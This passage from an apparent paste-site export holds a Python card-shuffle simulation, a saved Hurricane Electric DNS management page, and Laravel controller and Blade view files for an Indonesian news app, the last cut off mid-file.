number_of_shuffles = 1000

# verbosity of the script (1 = print finished shuffle, 2 = print every iteration, 3 = print everything)
log_level = 1

def main():
    stack_of_cards = [""c"" for x in range(0, 30)] + [""s"" for x in range(0, 10)] + [""i"" for x in range(0, 10)] + [""a"" for x in range(0, 11)] + [""l"" for x in range(0, 38)]
    print(""Unshuffled deck: "" + ''.join(stack_of_cards))
    
    for i in range(1, number_of_shuffles):
        stack_of_cards = riffleShuffle(stack_of_cards)
        if (log_level >= 2):
            print(""Shuffled deck "" + str(i) + "" times: ["" + str(landScore(stack_of_cards)) + ""] "" + ''.join(stack_of_cards))
    stack_of_cards = riffleShuffle(stack_of_cards)
    print(""Shuffled deck "" + str(number_of_shuffles) + "" times: ["" + str(landScore(stack_of_cards)) + ""] "" + ''.join(stack_of_cards))
    
def riffleShuffle(stack_of_cards):
    split_stack_of_cards = splitStack(stack_of_cards)
    shuffled_stack = mergeStacks(split_stack_of_cards[0], split_stack_of_cards[1])
    return (shuffled_stack)

def splitStack(stack_of_cards):
    size_of_stack = len(stack_of_cards)
    deviation_in_cards = round(random.uniform(0, 1) * splitting_deviation_in_cards)
    deviation_is_positive = coinFlip()
    deviation_from_middle_of_stack = deviation_in_cards if deviation_is_positive else -deviation_in_cards
    middle_of_stack = round(size_of_stack / 2) + deviation_from_middle_of_stack
    
    left_half = [stack_of_cards[i] for i in range(0,middle_of_stack)]
    right_half = [stack_of_cards[i] for i in range(middle_of_stack,size_of_stack)]
    split_stack_of_cards = [left_half, right_half]
    
    if (log_level >= 3):
        print("" missed the center of the deck by "" + str(deviation_from_middle_of_stack) + "" cards while splitting: "" + str(split_stack_of_cards))
    return split_stack_of_cards

def mergeStacks(lhs, rhs):
    next_card_comes_from_from_lhs = True if first_card_is_always_from_left_stack else coinFlip()
    probability_that_next_card_comes_from_opposite_site = (1 - merging_randomness/2)
    
    merged_stack = [lhs.pop(0)] if next_card_comes_from_from_lhs else [rhs.pop(0)]
    while (len(lhs) > 0 and len(rhs) > 0):
        random_number = random.uniform(0, 1)
        if (random_number <= probability_that_next_card_comes_from_opposite_site):
            next_card_comes_from_from_lhs = not next_card_comes_from_from_lhs
        merged_stack.append(lhs.pop(0) if next_card_comes_from_from_lhs else rhs.pop(0))
    
    for card in lhs:
        merged_stack.append(card)
    for card in rhs:
        merged_stack.append(card)
    
    return merged_stack
    
def landScore(stack_of_cards):
    consecutive_lands_list, consecutive_non_lands_list = landAnalysis(stack_of_cards)
    consecutive_lands_score = sum([pow(2, x-2) for x in consecutive_lands_list if x >= 2])
    consecutive_non_lands_score = sum([pow(2, x-3) for x in consecutive_non_lands_list if x >= 3])

    return consecutive_lands_score + consecutive_non_lands_score

def landAnalysis(stack_of_cards):
    consecutive_lands_list = []
    consecutive_non_lands_list = []
    land_streak = 0
    non_land_streak = 0
    for card in stack_of_cards:
        if (card == 'l'):
            land_streak = land_streak + 1
            if (non_land_streak > 0):
                consecutive_non_lands_list.append(non_land_streak)
            non_land_streak = 0
        else:
            non_land_streak = non_land_streak + 1
            if (land_streak > 0):
                consecutive_lands_list.append(land_streak)
            land_streak = 0
    if (land_streak > 0):
            consecutive_lands_list.append(land_streak)
    if (non_land_streak > 0):
        consecutive_non_lands_list.append(non_land_streak)
    return (consecutive_lands_list, consecutive_non_lands_list)
    
def coinFlip():
    return round(random.uniform(0, 1))
    

main()"
AuDC50t5,dns.he.net code,RingtailedFox,HTML,Saturday 26th of July 2025 07:10:54 PM CDT,"```
<!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Transitional//EN"" ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"">
<html xmlns=""http://www.w3.org/1999/xhtml"" lang=""en-US"" xml:lang=""en-US"">
<head>
<title>Hurricane Electric Hosted DNS</title>
<link rel=""stylesheet"" type=""text/css"" href=""/include/css/edit_dns.css"" />
<link rel=""stylesheet"" type=""text/css"" href=""/include/css/style.css"" media=""screen, print"" />
<!-- <link rel=""stylesheet"" type=""text/css"" href=""/include/js/jqdt/media/css/jquery.dataTables.css"" /> -->
<script src=""/include/js/jquery-1.4.2.min.js"" type=""text/javascript""></script>
<script src=""/include/js/jquery.jeditable.mini.js"" type=""text/javascript""></script>
<script src=""/include/js/jquery.json-2.2.min.js"" type=""text/javascript""></script>
<script src=""/include/js/admin_system.test.js?13009429509"" type=""text/javascript""></script>
<script src=""/include/js/jquery-ui/js/jquery-ui-1.8.1.custom.min.js"" type=""text/javascript""></script>
<script src=""/include/js/jqdt/media/js/jquery.dataTables.js"" type=""text/javascript""></script>


<link rel=""stylesheet"" type=""text/css"" href=""/include/js/jquery-ui/css/smoothness/jquery-ui-1.8.1.custom.css"" />
<meta http-equiv=""Content-Type"" content=""text/html; charset=iso-8859-1"" />
<script type=""text/javascript"">

$(document).ready(function() {	
		//if close button is clicked
		$('.window .close').click(function (e) {
		//Cancel the link behavior
			e.preventDefault();
		$('#mask, .window').hide();
		});
			
		//hide the all of the element with class msg_body
		$("".toggle"").hide();
		//toggle the componenet with class msg_body
		$("".toggle_head"").click(function()
		{
		  $(this).next("".toggle"").slideToggle(100);
		});
		// Set up the tabs. 
		
		$(function() {
			$(""#tabs"").tabs();
		});
		$('#tabs ul li a').click(function () {location.hash = $(this).attr('href');}); 
  //if mask is clicked
  $('#mask').click(function () {
   $(this).hide();
   $('.window').hide();
  });  			
  $('#dialog_incomplete').dialog({ autoOpen: false, title: 'What is an incomplete prefix?' });
  $('#dialog_imported').dialog({ autoOpen: false, title: 'What is an imported prefix?' });
  $('#dialog_additional').dialog({ autoOpen: false, title: 'What is an additional prefix?' });
  $('#dialog_inactive').dialog({ autoOpen: false, title: 'What is an inactive prefix?' });
  $('#dialog_active_domains').dialog({ autoOpen: false, title: 'What is an active domain?' });
  $('#dialog_slave_domains').dialog({ autoOpen: false, title: 'What is an slave domain?' });
  $('input[title]').inputHints();
	  $(""#raw_zone_toggle"").toggle(
	function () { $(""#raw_zone"").show(""slow"");
			$('#raw_zone_toggle').attr('src','/include/images/collapse.gif');
		 }, function () { $(""#raw_zone"").hide(""slow"");
			$('#raw_zone_toggle').attr('src','/include/images/expand.gif'); });

$('#domains_table').dataTable({ ""bFilter"" : false, ""bPaginate"":false, ""bInfo"":false, ""bStateSave"":true });
$('#secondary_table').dataTable({ ""bFilter"" : false, ""bPaginate"":false, ""bInfo"":false, ""bStateSave"":true });

});
</script>

</head>
<body><div id=""mask""></div>
	<div id=""page_center"">
		<div id=""header"">
			<a href=""http://he.net/""><img src=""/include/images/helogo.gif"" alt=""Hurricane Electric Internet Services"" /></a><br />
		</div>

		<div class=""sidebar"" id=""navigation"">
			<div class=""block""><div class=""caption"">Account Menu</div>
				<ul class=""menu"">
							<li class=""heavy"">Welcome<br />My Name</li>							<li>Origin <a href=""http://ipv6.he.net/"">ipv6.he.net</a></li>							<li><a id=""_tlogout"" href=""/?action=logout"" class=""heavy"">Logout</a></li>
				</ul></div>
			
			
			<div class=""block"">
				<div class=""caption"">Zone Functions</div>
				<ul class=""menu"">
				  
          <li><a href=""#"" onclick=""launchWindow('#add_zone');"" >Add a new domain</a></li>
          <!-- <li><a href=""#"" onclick=""launchWindow('#add_bind_zone');"" >Add raw zone</a></li> -->
          <li><a href=""#"" onclick=""launchWindow('#add_slave');"" >Add a new slave</a></li>
          <li><a href=""#"" onclick=""launchWindow('#add_reverse');"" >Add a new reverse</a></li>
          
          <!-- <li><a href=""/?action=dig&menu=diagzone"" class=""heavy"">Troubleshoot zones</a></li>
          <li><a href=""/?action=report&menu=report"" class=""heavy"">Zone report</a></li>
          <li><a href=""/?action=exportzones&menu=export"" class=""heavy"">Export zones</a></li>
          <li><a href=""/?action=importzones&menu=import"" class=""heavy"">Import zones</a></li> -->
				</ul>
			</div>
			
      
			<div class=""block"">
				<div class=""caption"">Quick Links</div>
				<div class=""content"">
					<a href=""http://ipv6.he.net/certification/"">Certification</a><br />

					<a href=""http://www.tunnelbroker.net/"">Tunnelbroker</a><br />
					<a href=""http://dns.he.net/"">Free DNS</a><br />
					<a href=""http://www.tunnelbroker.net/forums/"">Forums</a><br />
					<a href=""http://ipv6.he.net/certification/faq.php"">FAQ</a><br />
					<a href=""http://ipv6.he.net/presentations.php"">Video Presentations</a><br />
					<a href=""http://networktools.he.net"">Mobile Network Apps</a><br />
					<!-- <a href=""usage/index.php"">Usage Statistics</a><br /> -->

					<!-- <a href=""status.php"">Tunnel Server Status</a> <br /> -->
					<a href=""http://he.net/Hurricane_Electric_Geographic_Network_Map.jpg"">Network Map</a><br />
					<a href=""http://lg.he.net"">Looking Glass</a> (v4/v6)<br />
					<a href=""telnet://route-server.he.net"">Route Server</a> (telnet)<br />

					<a href=""http://bgp.he.net/ipv6-progress-report.cgi"">Global IPv6 Report</a><br />
    				</div>
			</div>
			<div class=""block"">
				<div class=""caption"">Services</div>
				<div class=""content"">

					<a href=""http://he.net/ip_transit.html"">Transit</a><br />
					<a href=""http://he.net/colocation.html"">Colocation</a><br />
					<a href=""http://he.net/dedicated_server.html"">Dedicated Servers</a>
				</div>
			</div>
		</div>		
		<div id=""content"">
			<div class=""block"">				<div class=""caption"" >Hurricane Electric Free DNS Management</div><style type=""text/css"">
A:link {text-decoration: none; color: #000}
A:visited {text-decoration: none; color: #000}
A:active {text-decoration: none; color: #000}
A:hover {text-decoration: underline; color: #0000ff}

.generic_table tr:hover {
background: #ccc;
}

.generic_table td
{
border-width: 1px 1px 0 0;
border-style: solid;
margin: 0;
padding: 1px;
}

.generic_table th
{
background: #ccc;
border-width: 0 1px 0 0;
border-style: solid;
margin: 0;
padding: 4px;
font-size: 80%;
}

.generic_table
{
border-width: 1px 0px 1px 1px;
border-style: solid;
width: 100%;
}

#close {
    float:right;display:inline-block;padding:2px 5px;background:#ccc;
}

</style>
<div id=""hosteddns"">



<span style=""display: none;"">
<form action=""/index.cgi"" method=""post"" name=""remove_domain"">
<input type=""hidden"" name=""account"" value=""tb53f460ec69ac07.77317362""/>
<input id=""delete_id"" type=""hidden"" name=""delete_id"" value="""" />
<input type=""hidden"" name=""remove_domain"" value=""1"" /></form>
</span><div style=""border: 1px solid black; padding:5px 10px;"" class=""dns_add window"" id=""add_zone"">
<form action=""/index.cgi"" method=""post"" name=""add_zone"">
<input type=""hidden"" name=""action"" value=""add_zone"" />	
<span style=""display: none;""><input type=""hidden"" name=""retmain"" value=""0"" /></span>
Please enter the domain name in the space provided.  For rDNS associated with this account, please use the rDNS options located below or enter the fully qualified in-addr.arpa/ip6.arpa zone below.
<br />
<br />
<span style=""font-size: 20px;"">Domain Name </span><br /><input id=""_name"" type=""text"" style=""width: 445px; font-size: 20px;"" name=""add_domain"" class=""defaultText"" title=""example.com"" /><br /><br />
<input style=""color: #fff; background: green;"" type=""submit"" name=""submit"" value=""Add Domain!""/>
<input class=""close"" name=""hosted_dns_addrecord_cancel"" value=""Cancel"" id=""btn_cancel"" onclick=""addPanelClose()"" type=""reset"" />
</form>
</div>
<!-- slave -->
<div style=""border: 1px solid black; padding:5px 10px;"" class=""dns_add window"" id=""add_slave"">
<form action=""/index.cgi"" method=""post"" name=""add_slave"">
<input type=""hidden"" name=""action"" value=""add_slave"" />
<span style=""display: none;""><input type=""hidden"" name=""retmain"" value=""0"" /></span>
Please enter the domain name in the space below.  Enter the masters that we should pull from in the spaces provided below.<br /><br />
<div style=""font-weight: bold;"">Please allow zone transfers from slave.dns.he.net (216.218.133.2/2001:470:600::2).<br />
<img src=""/include/images/error.png"" alt=""warning"" /> Verify that you are sending NOTIFIES to ns1.he.net and NOT slave.dns.he.net.  Failure to do so may delay your updates.<br /> 
<img src=""/include/images/error.png"" alt=""warning"" /> Verify that you have DELEGATED TO AT LEAST ONE of ns1.he.net, ns2.he.net, ns3.he.net, ns4.he.net, ns5.he.net and IT IS CORRECTLY LISTED in your master zone.<br />
<ul style=""background: #fee; margin: 5px; border: 1px solid #f00; color: #f00;"">
<li>Using the slave feature with DNSSEC pre-signed zones should work as expected.</li>
<li>Very large zones will not be permitted.</li>
</ul>
</div>
<br />
<span style=""font-size: 20px;"">Domain Name </span><br/><input type=""text"" style=""width: 445px; font-size: 20px;"" name=""add_slave"" class=""defaultText"" title=""example.com"" /><br /><br />
<fieldset>
  <legend>Masters that allow us to pull updates for this domain<span style=""font-size: 10px;""> (You need at least one)</span></legend>
    <span style=""font-size: 14px;"">Master #1 </span><br /><input type=""text"" style=""width: 425px; font-size: 14px;"" name=""master1"" class=""defaultText"" title=""ns1.example.com"" /><br />
    <span style=""font-size: 14px;"">Master #2 </span><br /><input type=""text"" style=""width: 425px; font-size: 14px;"" name=""master2"" class=""defaultText"" title=""ns2.example.com"" /><br />
    <span style=""font-size: 14px;"">Master #3 </span><br /><input type=""text"" style=""width: 425px; font-size: 14px;"" name=""master3"" class=""defaultText"" title=""ns3.example.com"" /><br />
    <!-- <span style=""font-size: 14px;"">Master #4 </span><br /><input type=""text"" style=""width: 425px; font-size: 14px;"" name=""master4"" class=""defaultText"" title=""ns4.example.com"" /><br />
    <span style=""font-size: 14px;"">Master #5 </span><br /><input type=""text"" style=""width: 425px; font-size: 14px;"" name=""master5"" class=""defaultText"" title=""ns5.example.com"" /><br /> -->
</fieldset>
<fieldset>
  <legend>TSIG mechanism for secure AXFR<span style=""font-size: 10px;""> (<strong>Not Required</strong>)</span></legend>
    <span style=""font-size: 14px;"">Hash Algorithm</span><br />
	<select style=""width: 425px; font-size: 14px;"" id=""algorithm"" name=""algorithm"" />
	<option name="""" value="""" selected=""selected"" />No TSIG</option><br />
	<option name=""hmac-md5"" value=""hmac-md5"" />hmac-md5</option><br />
	<option name=""hmac-sha1"" value=""hmac-sha1"" />hmac-sha1</option><br />
	<option name=""hmac-sha224"" value=""hmac-sha224"" />hmac-sha224</option><br />
	<option name=""hmac-sha256"" value=""hmac-sha256"" />hmac-sha256</option><br />
	<option name=""hmac-sha384"" value=""hmac-sha384"" />hmac-sha384</option><br />
	<option name=""hmac-sha512"" value=""hmac-sha512"" />hmac-sha512</option><br />
	</select><br />
    <span style=""font-size: 14px;"">Key Name</span><br /><input type=""text"" style=""width: 425px; font-size: 14px;"" name=""keyname"" class=""defaultText"" title=""e5c56b6a-c63e-49b4-9393-36cbda6df27e.uniq.example"" /><br />
    <span style=""font-size: 14px;"">Secret Hash</span><br /><input type=""text"" style=""width: 425px; font-size: 14px;"" name=""secret"" class=""defaultText"" title=""super-seekrit-hash-value"" /><br />

</fieldset>
<br />
<input style=""color: #fff; background: green;"" type=""submit"" name=""submit"" value=""Add Slave!""/>
<input class=""close"" name=""hosted_dns_addrecord_cancel"" value=""Cancel"" id=""btn_cancel"" onclick=""addPanelClose()"" type=""reset"" />
</form>
</div>
<!-- Display Zone-->
<div style=""border: 1px solid black; padding:5px 10px;"" class=""dns_add window"" id=""dumped_zone"">
</div>
<!-- bulk -->
<div style=""border: 1px solid black; padding:5px 10px;"" class=""dns_add window"" id=""add_bind_zone"">
<form action=""/index.cgi"" method=""post"" name=""add_bind_zone"">
<input type=""hidden"" name=""menu"" value=""add_bind_zone"" />
<span style=""display: none;""><input type=""hidden"" name=""retmain"" value=""0"" /></span>
Please enter the domain name in the space below.  Paste the zone in the textbox below.<br />
<br />
<span style=""font-size: 20px;"">Domain Name </span><input type=""text"" style=""width: 445px; font-size: 20px;"" name=""domain_name"" class=""defaultText"" title=""example.com"" /><br /><br />
    <span style=""font-size: 14px;"">Raw Zone</span><br />
<textarea name=""raw_zone"" style=""font-size: 10px; width: 445px;"" rows=""12"" >
</textarea>
<br />
<input style=""color: #fff; background: green;"" type=""submit"" name=""submit"" value=""Add Zone!""/>
<input class=""close"" name=""hosted_dns_addrecord_cancel"" value=""Cancel"" id=""btn_cancel"" onclick=""addPanelClose()"" type=""reset"" />
</form>
</div>
<!-- reverse -->
<div style=""border: 1px solid black; padding:5px 10px;"" class=""dns_add window"" id=""add_reverse"">
<form action=""/index.cgi"" method=""post"" name=""add_reverse"">
<input type=""hidden"" name=""action"" value=""add_reverse"" />
<span style=""display: none;""><input type=""hidden"" name=""retmain"" value=""0"" /></span>
To manage a reverse zone using the simplified method, please provide the prefix in the box below.  IPv6 will be handed as a standard ip6.arpa zone. 
IPv4 can be handled using a variety of methods.  Select one from the list below.
<br />
<br />
<span style=""font-size: 20px;"">Prefix </span><br /><input type=""text"" style=""width: 445px; font-size: 14px;"" name=""add_reverse"" class=""defaultText"" title=""2001:470:c0ff:ee::/64 or 10.10.1.0/24"" /><br />
<br />
<fieldset>  
<legend>Reverse Method (IPv4 only)</legend>
<input type='checkbox' name='method' value='rfc4183' class='unique'><span style=""font-size: 14px;"" /> RFC4183 </span><img src=""/include/images/help.png"" style=""cursor: help;"" alt=""help"" /><br />
<input type='checkbox' name='method' value='rfc2317' class='unique'><span style=""font-size: 14px;"" /> RFC2317 </span><img src=""/include/images/help.png"" style=""cursor: help;"" alt=""help"" /><br />
<input type='checkbox' name='method' value='degroot' class='unique'><span style=""font-size: 14px;"" /> DeGroot </span><img src=""/include/images/help.png"" style=""cursor: help;"" alt=""help"" /><br />
<input type='checkbox' name='method' value='standard' class='unique'><span style=""font-size: 14px;"" /> Standard (for blocks on octet boundaries) </span><img src=""/include/images/help.png"" style=""cursor: help;"" alt=""help"" /><br />
</fieldset>
<br />
<script>$('input.unique').click(function() { $('input.unique:checked').not(this).removeAttr('checked'); });</script>
<input style=""color: #fff; background: green;"" type=""submit"" name=""submit"" value=""Add Prefix!""/>
<input class=""close"" name=""hosted_dns_addrecord_cancel"" value=""Cancel"" id=""btn_cancel"" onclick=""addPanelClose()"" type=""reset"" />
</form>
</div><!-- START -->
<div id=""tabs"">
	<ul style=""font-size: 62.5%"">
		<li><a href=""#tabs-standard"">Zone Management</a></li>
		<li><a href=""#tabs-advanced"" style=""color: red;"">Advanced</a></li>		
	</ul>
<div id=""tabs-standard""></table>
<!-- Start slave table -->


<!-- End slave table -->
<!-- Start domain panel--><br />

<table width=""100%"" id=""domains_table"" class=""generic_table"" border=""1"" cellpadding=""0"" cellspacing=""0"">
    <thead><tr><th><img src=""/include/images/link_go.png"" alt=""Open Link""/></th><th><img src=""/include/images/pencil.png"" alt=""Edit"" /></th><th>Active domains for this account<img src=""/include/images/help.png"" onclick=""$('#dialog_active_domains').dialog('open')"" style=""cursor: help;"" alt=""help"" /></th><th><img src=""/include/images/delete.png"" alt=""Delete"" /></th></thead><tbody>	<tr>
		<td style=""cursor: pointer;"">
			<img class=""Tips""
		        title=""Open URL::Open thefurrycollective.ca in a new window.""
		        alt=""go"" src=""/include/images/link_go.png""
			onclick=""window.open('http://thefurrycollective.ca','thefurrycollective.ca')"" />
		</td>		<td style=""cursor: pointer;"">
			<img class=""Tips""
		        title=""Edit Zone::Use this option to edit the zonefile.  You would use this if you wanted to add or remove subdomains, etc""
		        alt=""edit"" src=""/include/images/pencil.png"" name=""thefurrycollective.ca""
			onclick=""javascript:document.location.href='?hosted_dns_zoneid=1211377&menu=edit_zone&hosted_dns_editzone'""
			/>		</td>
		<td width=""100%"" class="""" style=""padding-left: 3px;"">
			<span>thefurrycollective.ca</span>
		</td>
		<td style=""cursor: pointer;"">
			<img class=""Tips""
			title=""Using this option will PERMANENTLY remove the zone from your account.""
			alt=""delete""  onclick=""delete_dom(this);"" name=""thefurrycollective.ca"" value=""1211377"" src=""/include/images/delete.png"" />
		</td>
	</tr>
</tbody>
</table><!-- End Domain panel-->
<br />
<table width=""100%"" class=""generic_table"" border=""1"" cellpadding=""0"" cellspacing=""0"">
  <div style=""background-color:#ccc; height: 20px;"">
          <div style=""width:2%;
    height: 20px; background-color:#5b93bf; border-right:1px #fff solid;""></div>
          <div style=""margin-top:-20px; color:#000; margin-left: 4px;"">Domains 1/50      </div>
      <div style=""text-align:right; margin-top:-20px; color:#000; padding-right:4px;"">2%</div>
  </div>
</table>
</div> <!-- end tab-standard-->
<div id=""tabs-advanced"">
	<table width=""100%"" class=""generic_table"" border=""1"" cellpadding=""0"" cellspacing=""0"">
		<tr><th colspan=""4"">Active arpa zones for this account (advanced)</th></tr>
      </td>
    </tr>    <tr><td colspan=""4"" style=""color: red; text-align: center;"">You have no arpa zones configured for this account.  Add some using the links to the left.</td></tr>	</table>
  <br />
  <table width=""100%"" class=""generic_table"" border=""1"" cellpadding=""0"" cellspacing=""0"">
    <div style=""background-color:#ccc; height: 20px;"">
            <div style=""width:2%;
      height: 20px; background-color:#5b93bf; border-right:1px #fff solid;""></div>
            <div style=""margin-top:-20px; color:#000; margin-left: 4px;"">Domains 1/50        </div>
        <div style=""text-align:right; margin-top:-20px; color:#000; padding-right:4px;"">2%</div>
    </div>
  </table>
</div> <!-- end tab #1 -->
<!-- Start help dialog -->
<div id=""dialog_incomplete"">
  Prefixes tagged as 'Incomplete' are correctly delegated, but have not yet been activated.  To activate them simply click on
  the entry.  This will automatically create the correct zone file and bring you to the maintenance interface.  If you have other prefixes that are
  associated with your account, but do not appear here, please return to the <a href=""http://ipv6.he.net"" class=""heavy"">IPv6.he.net</a> 
  interface and re-delegate them. If you do not wish to use the simplified maintenance interface, you may edit the zone directly.
  To do this, click on the zone under the 'Advanced' tab.<br /><br />
</div>
<div id=""dialog_imported"">
  Prefixes within this section were delegated to ns1, ns2, ns3, ns4 and ns5.he.net from within the tunnelbroker interface and have been imported here.
  They are ready for you to use.
</div>
<div id=""dialog_additional"">
  Prefixes within this section have been delegated to ns1, ns2, ns3, ns4 and ns5.he.net and were entered manually by you.
</div>
<div id=""dialog_inactive"">
  Prefixes within this section have been allocated to your account and delegated to ns1, ns2, ns3, ns4 and ns5.he.net from the admin.he.net 
  administration portal.  They are ready to use.  Click on the 'edit' icon to build the reverse zone and begin adding entries.
</div>
<div id=""dialog_active_domains"">
  Domains within this section have been entered manually by you are are ready to edit.
</div>
<div id=""dialog_slave_domains"">
  Domains within this section are not editable.  We pull the zone from the nameservers specified when you made the entry.  Should you decide to
  change the nameservers, you will need to delete the zone, and recreate it with new nameservers.  <a href=""http://en.wikipedia.org/wiki/Lame_delegation"" target=""_new"">Lame delegations</a>
  will be culled from time to time.  Please make sure your domains have been correctly delegated.
</div>
<!-- end -->
  <div style=""padding: 3px; border: 1px solid black; background: #eee; font-size: 11px;"">
  <span style=""font-weight: bold; text-transform: uppercase;"">notes:</span><br />
    At this time, we are limiting the free service to 50 zones which includes your reverse zones (if any).<br />
    Questions or comments regarding this tool should be directed to <a href=""mailto:support@he.net"" style=""font-style: italic;"">support@he.net</a>.<br />
    Bugs or feature requests should be directed to <a href=""mailto:dnsadmin@he.net"" style=""font-style: italic;"">dnsadmin@he.net</a>.<br />
    Our TOS/AUP is now online. <a href=""/tos.html"" target=""_new"">click for our Terms of Service</a>.
    </div>
</div>
</div>
</div>
</div>
		<div id=""footer"">
				<address id=""footer_left"">Hurricane Electric<br />760 Mission Court<br />Fremont, CA  94539</address>
				<span id=""footer_right"">Voice +1 (510) 580-4100<br />Fax +1 (510) 580-4151<br />Comments? <a href=""mailto:info@he.net"">info@he.net</a></span>

				<span id=""footer_center""><br />Copyright &copy; Hurricane Electric.<br />All Rights Reserved 0.048612</span>
		</div>
	</div>
	
	<pre>	</pre>
<script type=""text/javascript"">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-24281877-1']);
  _gaq.push(['_setDomainName', '.he.net']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>
	</body>
</html>
```"
YQ5kF99d,TK3 - No.4 - BeritaController.php,ferdysetia_aan,PHP,Saturday 26th of July 2025 06:32:08 PM CDT,"<?php

namespace App\Http\Controllers;

use App\Models\Berita; // Pastikan model di-import di sini
use Illuminate\Http\Request;

class BeritaController extends Controller
{
    // Menampilkan daftar berita
    public function index()
    {
        $beritas = Berita::all(); // Ambil semua data berita
        return view('berita.index', compact('beritas'));
    }

    // Menampilkan form untuk membuat berita baru
    public function create()
    {
        return view('berita.create');
    }

    // Menyimpan berita baru
    public function store(Request $request)
    {
        $request->validate([
            'judul' => 'required|string|max:255',
            'konten' => 'required|string',
        ]);

        Berita::create([
            'judul' => $request->judul,
            'konten' => $request->konten,
        ]);

        return redirect()->route('berita.index')->with('success', 'Berita berhasil ditambahkan.');
    }

    // Menampilkan detail berita
    public function show($id)
    {
        $berita = Berita::findOrFail($id);
        return view('berita.show', compact('berita'));
    }

    // Menampilkan form untuk mengedit berita
    public function edit($id)
    {
        $berita = Berita::findOrFail($id);
        return view('berita.edit', compact('berita'));
    }

    // Memperbarui berita yang sudah ada
    public function update(Request $request, $id)
    {
        $request->validate([
            'judul' => 'required|string|max:255',
            'konten' => 'required|string',
        ]);

        $berita = Berita::findOrFail($id);
        $berita->update([
            'judul' => $request->judul,
            'konten' => $request->konten,
        ]);

        return redirect()->route('berita.index')->with('success', 'Berita berhasil diperbarui.');
    }

    // Menghapus berita
    public function destroy($id)
    {
        $berita = Berita::findOrFail($id);
        $berita->delete();

        return redirect()->route('berita.index')->with('success', 'Berita berhasil dihapus.');
    }
}
"
MmgXsWHF,TK3 - No.1 - show.blade.php,ferdysetia_aan,PHP,Saturday 26th of July 2025 06:11:10 PM CDT,"@extends('layouts.app')

@section('content')
    <div class=""container"">
        <div class=""news-article"">
            <h1>{{ $berita->judul }}</h1>
            <p class=""meta-info"">
                <span class=""author"">Penulis: {{ $berita->author }}</span> | 
                <span class=""date"">{{ $berita->created_at->format('d F Y') }}</span>
            </p>
            <div class=""content"">
                <p>{{ $berita->konten }}</p>
            </div>

            <div class=""actions"">
                <a href=""{{ route('berita.edit', $berita->id_berita) }}"" class=""btn btn-warning"">Edit</a>

                <form action=""{{ route('berita.destroy', $berita->id_berita) }}"" method=""POST"" style=""display:inline;"">
                    @csrf
                    @method('DELETE')
                    <button type=""submit"" class=""btn btn-danger"">Hapus</button>
                </form>
            </div>
        </div>
    </div>
@endsection

@section('css')
    <style>
        .container {
            width: 90%;
            max-width: 960px;
            margin: 0 auto;
        }

        .news-article {
            background-color: #ffffff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            margin-bottom: 30px;
        }

        h1 {
            font-size: 2.5rem;
            font-weight: bold;
            margin-bottom: 15px;
            color: #333;
        }

        .meta-info {
            font-size: 0.9rem;
            color: #777;
            margin-bottom: 20px;
        }

        .author, .date {
            margin-right: 10px;
        }

        .content {
            font-size: 1.15rem;
            line-height: 1.8;
            color: #555;
            margin-bottom: 20px;
        }

        .actions {
            display: flex;
            gap: 15px;
            margin-top: 20px;
        }

        .actions .btn {
            padding: 10px 20px;
            text-align: center;
            border-radius: 5px;
            font-size: 14px;
            border: none;
        }

        .btn-warning {
            background-color: #ffc107;
            color: white;
            transition: background-color 0.3s;
        }

        .btn-warning:hover {
            background-color: #e0a800;
        }

        .btn-danger {
            background-color: #dc3545;
            color: white;
            transition: background-color 0.3s;
        }

        .btn-danger:hover {
            background-color: #c82333;
        }

        /* Responsive Design */
        @media (max-width: 768px) {
            .news-article {
                padding: 20px;
            }

            h1 {
                font-size: 2rem;
            }

            .content {
                font-size: 1rem;
            }

            .actions {
                flex-direction: column;
                gap: 10px;
            }

            .btn {
                width: 100%;
                padding: 12px;
                font-size: 16px;
            }
        }
    </style>
@endsection
"
2f9Kx600,TK3 - No.1 - create.blade.php,ferdysetia_aan,PHP,Saturday 26th of July 2025 06:10:23 PM CDT,"@extends('layouts.app')

@section('content')
    <div class=""container"">
        <div class=""news-article"">
            <h1>Tambah Berita Baru</h1>
            <form action=""{{ route('berita.store') }}"" method=""POST"">
                @csrf
                <div class=""form-group"">
                    <label for=""judul"">Judul</label>
                    <input type=""text"" name=""judul"" id=""judul"" class=""form-control"" required>
                </div>
                <div class=""form-group"">
                    <label for=""konten"">Konten</label>
                    <textarea name=""konten"" id=""konten"" class=""form-control"" required></textarea>
                </div>
                <button type=""submit"" class=""btn btn-primary"">Simpan</button>
            </form>
        </div>
    </div>
@endsection

@section('css')
    <style>
        .container {
            width: 90%;
            max-width: 960px; /* Increase max width for better space */
            margin: 0 auto;
        }

        .news-article {
            background-color: #ffffff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            margin-bottom: 30px;
        }

        h1 {
            font-size: 2.5rem;
            font-weight: bold;
            margin-bottom: 15px;
            color: #333;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            font-weight: bold;
            margin-bottom: 8px;
            color: #333;
        }

        .form-control {
            width: 100%;
            padding: 12px;
            border-radius: 5px;
            border: 1px solid #ddd;
            box-sizing: border-box;
            font-size: 1rem;
            color: #333;
        }

        textarea.form-control {
            resize: vertical;
            height: 180px;
        }

        button.btn {
            padding: 12px 20px;
            font-size: 16px;
            text-align: center;
            border-radius: 5px;
            border: none;
            background-color: #007bff;
            color: white;
            cursor: pointer;
            margin-top: 20px;
        }

        button.btn:hover {
            background-color: #0056b3;
        }

        /* Responsive Design */
        @media (max-width: 768px) {
            .news-article {
                padding: 20px;
            }

            h1 {
                font-size: 2rem;
            }

            .form-control {
                font-size: 0.95rem;
            }

            button.btn {
                width: 100%;
            }
        }
    </style>
@endsection
"
vgTbgNbj,TK3 - No.1 - edit.blade.php,ferdysetia_aan,PHP,Saturday 26th of July 2025 06:08:18 PM CDT,"@extends('layouts.app')

@section('content')
    <div class=""container"">
        <div class=""news-article"">
            <h1>Edit Berita</h1>
            <form action=""{{ route('berita.update', $berita->id_berita) }}"" method=""POST"">
                @csrf
                @method('PUT')
